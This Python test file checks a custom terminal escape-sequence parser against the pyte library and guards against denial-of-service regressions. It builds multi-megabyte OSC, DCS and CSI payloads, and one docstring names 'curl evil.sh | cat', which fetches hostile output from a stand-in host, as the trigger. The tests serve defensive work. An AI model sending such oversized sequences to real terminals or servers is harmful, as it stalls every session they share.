"""VTTokenizer(증분 VT 파서 PoC) 검증 — docs/internal/VT_PARSER_TRADEOFF_2026-06-15.md §6 옵션 B.

두 축으로 못박는다:
  (1) **차분(differential)**: pyte 가 정상 처리하는 시퀀스(텍스트/커서/SGR/erase/스크롤/
      와이드문자/private 모드)를 pyte.ByteStream 과 VTTokenizer 양쪽에 먹여 화면 상태
      (display + 커서)가 **바이트 동일**함을 확인 → 자작 파서가 충실한 VT 파서임을 입증.
  (2) **우회 흡수(subsumption)**: model.py 의 feed-전 우회 4종(콜론 SGR·XTMODKEYS·kitty·
      CSI-partial)이 필요했던 입력을, 우회가 적용된 **실제 Pane** 과 우회 없는
      VTTokenizer 가 **동일** 화면을 내는지로 등가 입증 → 우회를 파서가 흡수함.
  (+) 캡처 픽스처를 양 경로로 재생해 실제 출력에서도 동일함을 확인.
"""
import glob
import os
import time

import harness  # noqa: F401 (경로 설정)
import pyte
from pytmuxlib.model import Pane
from pytmuxlib.vtparse import VTTokenizer, _sgr_params_from_raw

FIXTURES = os.path.join(os.path.dirname(__file__), "fixtures", "claude")


def _ref_screen(chunks, cols, rows):
    """기준 경로: pyte.ByteStream(우회 없음)."""
    s = pyte.Screen(cols, rows)
    st = pyte.ByteStream(s)
    for ch in chunks:
        st.feed(ch)
    return s


def _tok_screen(chunks, cols, rows, with_alt=False):
    """대상 경로: VTTokenizer. with_alt 면 alt_hook 으로 main/alt Screen 을 스왑한다
    (model.Pane 의 _enter_alt/_leave_alt 등가). 현재 활성 Screen 을 반환한다."""
    main = pyte.Screen(cols, rows)
    state = {"alt": False, "s": None}
    tk = VTTokenizer(main)

    def _hook(enter):
        if enter and not state["alt"]:
            state["s"] = pyte.Screen(cols, rows)
            state["alt"] = True
            tk.set_screen(state["s"])
        elif not enter and state["alt"]:
            state["alt"] = False
            tk.set_screen(main)

    if with_alt:
        tk.alt_hook = _hook
    for ch in chunks:
        tk.feed(ch)
    return state["s"] if state["alt"] else main


def _pane(chunks, cols, rows):
    """현 우회 파이프라인: 실제 Pane.feed(콜론SGR/XTMODKEYS/kitty/CSI-partial/alt 적용)."""
    p = Pane(-1, -1, cols, rows)
    for ch in chunks:
        p.feed(ch)
    return p


def _cells(screen):
    """행별 (문자, 속성튜플) 목록 — display(텍스트)뿐 아니라 SGR 셀 속성까지 비교
    대상에 넣어 스타일 누락을 잡는다(텍스트만 보면 SGR 드롭 버그를 놓친다)."""
    out = []
    for y in range(screen.lines):
        row = screen.buffer[y]
        line = []
        for x in range(screen.columns):
            c = row[x]
            line.append((c.data, c.fg, c.bg, c.bold, c.italics,
                         c.underscore, c.reverse, c.strikethrough))
        out.append(line)
    return out


def _assert_same(a, b, label):
    assert a.display == b.display, (
        f"{label}: display 불일치\n  a={a.display}\n  b={b.display}")
    assert (a.cursor.x, a.cursor.y) == (b.cursor.x, b.cursor.y), (
        f"{label}: 커서 불일치 a=({a.cursor.x},{a.cursor.y}) "
        f"b=({b.cursor.x},{b.cursor.y})")
    ca, cb = _cells(a), _cells(b)
    assert ca == cb, f"{label}: 셀 속성(SGR) 불일치"


# ── (1) 차분: pyte 와 동일해야 하는 정상 시퀀스 ───────────────────────────────
async def test_differential_against_pyte_bytestream():
    cols, rows = 40, 6
    cases = {
        "plain": [b"hello\r\nworld\r\n"],
        "clear+addr": [b"\x1b[2J\x1b[3;5HX"],
        "column abs": [b"a\x1b[20Gb"],
        "sgr basic": [b"\x1b[1mBOLD\x1b[0m \x1b[31mRED\x1b[0m"],
        "cursor moves": [b"\x1b[5B\x1b[3Cxyz"],
        "wide cjk": ["가나다ABC".encode()],
        "cr overwrite": [b"AAAA\rBB"],
        "ins/del line": [b"row\r\n" * 5 + b"\x1b[2;1H\x1b[2L\x1b[1;1H\x1b[1M"],
        "ins/del char": [b"abcdef\x1b[1;3H\x1b[2@\x1b[1;3H\x1b[2P"],
        "sgr 24bit": [b"\x1b[38;2;100;150;200mTRUE\x1b[0m"],
        "sgr 256": [b"\x1b[38;5;82mIDX\x1b[0m"],
        "osc title": [b"\x1b]0;mytitle\x07rest"],
        "erase variants": [b"\x1b[2Jfoo\x1b[1Kbar\x1b[0J"],
        "reverse": [b"\x1b[7mREV\x1b[27mN"],
        "private cursor mode": [b"\x1b[?25lA\x1b[?25hB"],
        "scroll region": [b"\x1b[2;4r\x1b[2;1Hx\r\n" * 4],
    }
    for name, chunks in cases.items():
        ref = _ref_screen(chunks, cols, rows)
        tok = _tok_screen(chunks, cols, rows)
        _assert_same(ref, tok, f"diff[{name}]")


async def test_multibyte_split_across_feeds_no_fffd():
    """멀티바이트 UTF-8(CJK/이모지)이 feed 청크 경계로 잘려도 영속 incremental
    decoder 가 부분 바이트를 carry 해 **U+FFFD 없이** 원문자를 렌더한다.

    이게 owned ConPTY 백엔드(raw 바이트 read → 서버 feed)의 경계-안전성을 못박는
    플랫폼 독립 증거다 — Windows '스크롤 중 일시 U+FFFD'(IMPROVEMENT §1.1 후속,
    HANDOFF §10-C)는 **번들 OpenConsole 이 raw 바이트에 직접 emit** 하는 것이지
    우리 read/decode 층에서 나는 게 아님을 보인다(우리 층은 어느 바이트 경계에서
    잘려도 FFFD 를 만들지 않는다). pyte.ByteStream 도 동일하게 carry."""
    cols, rows = 20, 3
    text = "가나다😀漢字ABC"        # 3·3·3·4·3·3·1·1·1 바이트 혼합
    raw = text.encode("utf-8")
    # 모든 바이트 경계(멀티바이트 한가운데 포함)에서 2조각으로 잘라 먹인다.
    for cut in range(1, len(raw)):
        chunks = [raw[:cut], raw[cut:]]
        tok = _tok_screen(chunks, cols, rows)
        assert "�" not in tok.display, f"native split@{cut} 에 U+FFFD"
        ref = _ref_screen(chunks, cols, rows)
        _assert_same(ref, tok, f"mb-split@{cut}")
    # 한 바이트씩 흘려도(최악 경계) 동일.
    onebyte = _tok_screen([raw[i:i + 1] for i in range(len(raw))], cols, rows)
    assert "�" not in onebyte.display, "native 1바이트 스트림에 U+FFFD"
    _assert_same(_ref_screen([bytes([b]) for b in raw], cols, rows),
                 onebyte, "mb-split@1byte")


async def test_conformance_corpus_against_pyte():
    """vttest급 경계 케이스 — 스크롤영역/원점모드/탭스톱/문자셋/soft-reset/삽입모드를
    pyte.ByteStream 과 차분 비교(라이브 배선 전 파서 신뢰도 확보). 화면 상태 의미론은
    pyte.Screen 이 담당하므로 파서가 올바른 인자로 디스패치하면 동일해야 한다."""
    cols, rows = 30, 8
    cases = {
        # DECSTBM 스크롤영역 안에서 스크롤(index/RI)
        "scroll region index": [b"\x1b[3;6r\x1b[6;1HL\r\n" * 6],
        "scroll region RI": [b"\x1b[2;5r\x1b[2;1H\x1bM\x1bM\x1bMtop"],
        # 원점 모드(DECOM): 마진 기준 좌표
        "origin mode": [b"\x1b[3;6r\x1b[?6h\x1b[1;1HORIGIN\x1b[?6l"],
        # 탭스톱: HTS 설정 후 HT 이동, TBC 제거
        "tab stops set/clear": [b"\x1b[1;1H\x1b[5G\x1bH\x1b[1;1H\tX\x1b[g\tY"],
        # 문자셋 G0(UTF-8 모드에선 noop이라 평문 유지)
        "charset g0 noop": [b"\x1b(0abc\x1b(Bdef"],
        # soft reset(DECSTR) 후 재출력
        "soft reset": [b"\x1b[3;6r\x1b[1mBOLD\x1b[!p\x1b[1;1Hclean"],
        # 삽입 모드(IRM, set_mode 4)
        "insert mode IRM": [b"abcdef\x1b[1;3h\x1b[1;3HXY\x1b[4l"],
        # 커서 저장/복원(DECSC/DECRC)
        "save/restore cursor": [b"\x1b[3;5H\x1b7\x1b[1;1Hmoved\x1b8HERE"],
        # 줄/문자 반복 + 절대/상대 이동 혼합
        "mixed motion": [b"\x1b[2J\x1b[5;10HX\x1b[A\x1b[A\x1b[2DY\x1b[1;1Htop"],
        # ECH(문자 소거) + DCH/ICH 혼합
        "ech ich dch": [b"abcdefgh\x1b[1;2H\x1b[3X\x1b[1;5H\x1b[2@\x1b[1;5H\x1b[2P"],
    }
    for name, chunks in cases.items():
        ref = _ref_screen(chunks, cols, rows)
        tok = _tok_screen(chunks, cols, rows)
        _assert_same(ref, tok, f"conf[{name}]")


async def test_dcs_consumed_intentional_divergence():
    """DCS(`ESC P … ST`)는 pyte 가 본문을 출력으로 흘리는 것과 달리 토크나이저가
    **소비(드롭)**한다 — 의도적 개선(NEST DCS·DECRQSS 응답 등 제어 본문이 화면에
    잔해로 새지 않음). 본문이 화면에 안 보이고 전후 텍스트는 정상이어야 한다."""
    cols, rows = 30, 3
    tok = _tok_screen([b"A\x1bPq#0;1;0body-xyz\x1b\\B"], cols, rows)
    assert tok.display[0].strip() == "AB", repr(tok.display[0])
    # C1 ST(0x9c)로 끝나는 DCS, 그리고 BEL 은 DCS 종결이 아님(ST/ESC\\ 만).
    tok2 = _tok_screen(["X\x1bPdata\x9cY".encode()], cols, rows)
    assert tok2.display[0].strip() == "XY", repr(tok2.display[0])


async def test_dcs_partial_across_feeds():
    """DCS 가 청크 경계로 잘려도 증분 상태로 본문을 계속 소비한다(NEST DCS read 경계
    보전 등가). 어느 지점에서 쪼개도 본문이 새지 않아야 한다."""
    cols, rows = 30, 3
    full = b"A\x1bPq1;2;3 longish dcs body here\x1b\\B"
    whole = _tok_screen([full], cols, rows)
    assert whole.display[0].strip() == "AB"
    for cut in range(1, len(full)):
        split = _tok_screen([full[:cut], full[cut:]], cols, rows)
        _assert_same(whole, split, f"dcs split@{cut}")


async def test_osc_large_body_bounded_no_quadratic():
    """[보안 N1 회귀] 거대 OSC 본문(신뢰 불가 패널 출력)이 서버 feed 를 행/DoS
    시키지 않는다. 종결자까지 한 번에 흡수(O(n))하고 본문은 _OSC_MAX 로 캡한다.

    회귀 전: `self._osc += ch` 글자단위 누적(인스턴스 속성이라 in-place 최적화
    불가)이 O(n²) — 3MB OSC 가 ~200초 이벤트루프 블록(전 세션 멈춤). PTY read 크기
    청크로 흘려도 _osc 가 feed 간 유지돼 청킹이 무력이었다."""
    cols, rows = 20, 3
    big = b"\x1b]0;" + b"A" * 2_000_000 + b"\x07tail"
    chunks = [big[i:i + 65536] for i in range(0, len(big), 65536)]  # PTY read 모사
    t0 = time.perf_counter()
    scr = _tok_screen(chunks, cols, rows)
    dt = time.perf_counter() - t0
    # 수정 후 < 0.05초. 회귀(O(n²))면 수십~수백초 → 넉넉한 상한으로 행을 잡는다.
    assert dt < 2.0, f"OSC 2MB feed 가 {dt:.2f}s — O(n²) 회귀 의심"
    assert len(scr.title) <= VTTokenizer._OSC_MAX, f"title 미캡 {len(scr.title)}"
    assert scr.display[0].strip() == "tail", repr(scr.display[0])  # 종결 후 정상 복귀
    # DCS(드롭 경로)도 거대 본문에서 한 번에 스캔되는지(누적 없음) 함께 확인.
    dbig = b"X\x1bP" + b"B" * 2_000_000 + b"\x1b\\Y"
    dchunks = [dbig[i:i + 65536] for i in range(0, len(dbig), 65536)]
    t0 = time.perf_counter()
    dscr = _tok_screen(dchunks, cols, rows)
    assert time.perf_counter() - t0 < 2.0, "DCS 2MB feed 가 느림 — 누적 회귀 의심"
    assert dscr.display[0].strip() == "XY", repr(dscr.display[0])


async def test_csi_excess_params_not_quadratic():
    """[보안 F1 회귀, 2026-07-17] 과다 파라미터 CSI(신뢰 불가 패널 출력)가 서버를
    행/DoS 시키지 않는다.

    회귀 전: R2 수정(`_call_csi` 가 TypeError 마다 `p.pop()` 후 재시도)이 크래시를
    DoS 로 바꿨다 — 재시도마다 N-튜플을 다시 쌓아 O(N²). 실측 128KB 한 줄 = **4.76초**
    이벤트루프 정지(단일 스레드 → 전 클라·전 패널 동결), 입력 2배마다 4배, 1MB≈수 분.
    트리거는 `curl evil.sh | cat` 한 번이면 충분했다.

    **절대 시간이 아니라 스케일링 비율**을 본다 — 느린 CI 러너에서 플레이크가 나지
    않으면서 O(N²) 는 확실히 잡는다(이차면 비율 4.0, 선형이면 ~2.0)."""
    def feed_secs(kb):
        n = kb * 1024 // 2
        data = b"\x1b[" + b"1;" * n + b"H"          # H=cursor_position, arity 2
        p = Pane(-1, -1, 80, 24)
        t0 = time.perf_counter()
        p.feed(data)
        return time.perf_counter() - t0

    t1 = feed_secs(64)
    t2 = feed_secs(128)                              # 입력 2배
    # 선형이면 ~2배. 이차면 ~4배. 3.0 을 경계로 두면 러너 노이즈엔 둔감하고 O(N²)엔 민감.
    ratio = t2 / max(t1, 1e-6)
    assert ratio < 3.0, f"입력 2배에 시간 {ratio:.1f}배 — O(N²) 회귀(F1)"
    # 절대 상한은 아주 넉넉히(행 자체를 잡는 안전망). 수정 후 실측 0.023s.
    assert t2 < 2.0, f"128KB CSI feed 가 {t2:.2f}s — F1 회귀 의심"


async def test_csi_raw_param_buffer_bounded():
    """[보안 F2 회귀, 2026-07-17] 미종결 CSI 파라미터 본문(`_raw`)은 _RAW_MAX 로 캡된다.

    N1(OSC)의 **살아남은 형제**: `_OSC_MAX` 만 있고 `_raw` 엔 상한이 없어, 종결자 없는
    `ESC[` + 숫자 스트림이 ① `self._raw += ch` 의 O(n²) 로 CPU 를 태우고(400k자=1.15s,
    10MB=120초+) ② **종결자가 없어도 되므로** feed 를 넘어 본문이 영구 잔류해 메모리
    DoS 가 됐다. 캡은 자원 상한과 O(n) 을 동시에 준다."""
    cols, rows = 20, 3
    big = b"\x1b[" + b"1" * 3_000_000                # 미종결 — 종결자 일부러 없음
    chunks = [big[i:i + 65536] for i in range(0, len(big), 65536)]
    scr = pyte.Screen(cols, rows)
    tok = VTTokenizer(scr)
    t0 = time.perf_counter()
    for c in chunks:
        tok.feed(c)
    dt = time.perf_counter() - t0
    assert dt < 2.0, f"미종결 CSI 3MB 가 {dt:.2f}s — O(n²) 회귀(F2)"
    assert len(tok._raw) <= VTTokenizer._RAW_MAX, f"_raw 미캡 {len(tok._raw)}"
    # 캡 뒤에도 파서는 정상 복귀한다: 종결자를 만나면 시퀀스를 닫고 이후 글자는 출력.
    # (캡된 파라미터가 거대 행번호로 해석돼 커서는 마지막 행에 클램프되므로 행을
    # 특정하지 않고 화면 어딘가에 찍혔는지만 본다 — 요지는 "파서가 안 죽었다"이다.)
    tok.feed(b"Htail")
    assert any("tail" in row for row in scr.display), repr(scr.display)


async def test_osc_split_across_feeds_matches_pyte():
    """OSC(ST=ESC\\ 종결)가 청크 경계로 잘려도 증분 상태로 본문을 이어 흡수하고,
    pyte.ByteStream 과 동일 화면(타이틀 포함)을 낸다. ESC 가 feed 끝에 걸려 ST 를
    다음 feed 에서 받는 `_osc_esc` 이월 경로를 모든 경계에서 검증."""
    cols, rows = 20, 3
    full = b"A\x1b]2;win-title\x1b\\B"     # OSC 2 = 타이틀, ESC\\ 로 종결
    whole = _tok_screen([full], cols, rows)
    assert whole.title == "win-title", repr(whole.title)
    assert whole.display[0].strip() == "AB"
    for cut in range(1, len(full)):
        split = _tok_screen([full[:cut], full[cut:]], cols, rows)
        _assert_same(whole, split, f"osc split@{cut}")
        assert split.title == "win-title", f"osc split@{cut} title={split.title!r}"


# ── (2) 우회 흡수: 우회 적용 Pane == 우회 없는 VTTokenizer ─────────────────────
async def test_subsumes_colon_sgr_workaround():
    """_sanitize_sgr 가 필요했던 콜론식 SGR 을 파서가 직접 흡수."""
    cols, rows = 40, 4
    cases = {
        "underline off 4:0": [b"\x1b[4mU\x1b[4:0mX more"],
        "curly underline 4:3": [b"\x1b[4:3mC\x1b[mZ"],
        "24bit colon 38:2": [b"\x1b[38:2::10:20:30mRGB\x1b[0m tail"],
        "256 colon 38:5": [b"\x1b[38:5:82mIDX\x1b[0m"],
        "underline color 58 dropped": [b"\x1b[58:2::1:2:3mU\x1b[mtail"],
    }
    for name, chunks in cases.items():
        pane = _pane(chunks, cols, rows).screen
        tok = _tok_screen(chunks, cols, rows)
        _assert_same(pane, tok, f"colon[{name}]")


async def test_subsumes_private_csi_workarounds():
    """_PRIVATE_SGR_RE(XTMODKEYS)·_KITTY_KBD_RE 가 버리던 시퀀스를 파서가 직접 드롭."""
    cols, rows = 40, 4
    cases = {
        "xtmodkeys >..m": [b"\x1b[>4;2mAB\x1b[>4;0mCD"],
        "kitty push/pop >u <u": [b"\x1b[>1uHELLO\x1b[<u!"],
        "kitty query ?u": [b"\x1b[?1uQ\x1b[mX"],
    }
    for name, chunks in cases.items():
        pane = _pane(chunks, cols, rows).screen
        tok = _tok_screen(chunks, cols, rows)
        _assert_same(pane, tok, f"priv[{name}]")
    # 회귀 가드: 화면에 제어 잔해(m/u/숫자)가 새지 않아야 한다.
    tok = _tok_screen([b"\x1b[>4;2mAB\x1b[>1uCD\x1b[<u"], cols, rows)
    assert tok.display[0].strip() == "ABCD", repr(tok.display[0])


async def test_subsumes_csi_partial_across_feeds():
    """_CSI_PARTIAL_RE/_altcarry 가 처리하던 '청크 경계로 잘린 시퀀스'를 증분 상태로 흡수.
    임의 위치에서 쪼갠 입력이 한 번에 먹인 것과 동일한 화면을 내야 한다."""
    cols, rows = 40, 6
    full = (b"\x1b[2J\x1b[3;5HX\x1b[1;1H\x1b[38:2::10:20:30mC"
            b"\x1b[>4;2m\x1b[?1uABC\x1b[0m\x1b]0;ttl\x07Z")
    whole = _tok_screen([full], cols, rows)
    for cut in range(1, len(full)):
        split = _tok_screen([full[:cut], full[cut:]], cols, rows)
        _assert_same(whole, split, f"split@{cut}")
    # 한 바이트씩 쪼개도 동일.
    onebyte = _tok_screen([full[i:i + 1] for i in range(len(full))], cols, rows)
    _assert_same(whole, onebyte, "split@1byte")


async def test_alt_screen_routing_matches_pane():
    """alt-screen 전환(_ALT_RE)을 alt_hook 으로 흡수 — 실제 Pane 과 동일."""
    cols, rows = 30, 5
    chunks = [b"\x1b[2J\x1b[Hmain line\r\n",
              b"\x1b[?1049h\x1b[2J\x1b[HALT CONTENT here",
              b"\x1b[?1049l"]
    pane = _pane(chunks, cols, rows).screen         # 메인 복귀 상태
    tok = _tok_screen(chunks, cols, rows, with_alt=True)
    _assert_same(pane, tok, "alt round-trip")
    # alt 진입 직후(복귀 전)도 동일.
    pane2 = _pane(chunks[:2], cols, rows)
    tok2 = _tok_screen(chunks[:2], cols, rows, with_alt=True)
    assert pane2.alt_active is True
    _assert_same(pane2.screen, tok2, "alt entered")


# ── (+) 캡처 픽스처 재생 동등성 ───────────────────────────────────────────────
async def test_capture_fixtures_match_pyte():
    """실제 캡처(claude/*.txt)를 양 경로로 재생해 화면이 동일(정상 데이터 회귀망)."""
    cols, rows = 80, 24
    files = sorted(glob.glob(os.path.join(FIXTURES, "*.txt")))
    assert files, "캡처 픽스처 없음"
    for path in files:
        with open(path, "rb") as f:
            data = f.read()
        ref = _ref_screen([data], cols, rows)
        tok = _tok_screen([data], cols, rows)
        _assert_same(ref, tok, f"fixture[{os.path.basename(path)}]")


# ── 단위: SGR 콜론 변환 ───────────────────────────────────────────────────────
async def test_sgr_params_from_raw_unit():
    assert _sgr_params_from_raw("4:0") == [24]
    assert _sgr_params_from_raw("4:3") == [4]
    assert _sgr_params_from_raw("38:2::10:20:30") == [38, 2, 10, 20, 30]
    assert _sgr_params_from_raw("38:5:82") == [38, 5, 82]
    assert _sgr_params_from_raw("58:2::1:2:3") is None     # 밑줄색 → 버림
    assert _sgr_params_from_raw("1;38:5:82;4") == [1, 38, 5, 82, 4]
    assert _sgr_params_from_raw("0") == [0]
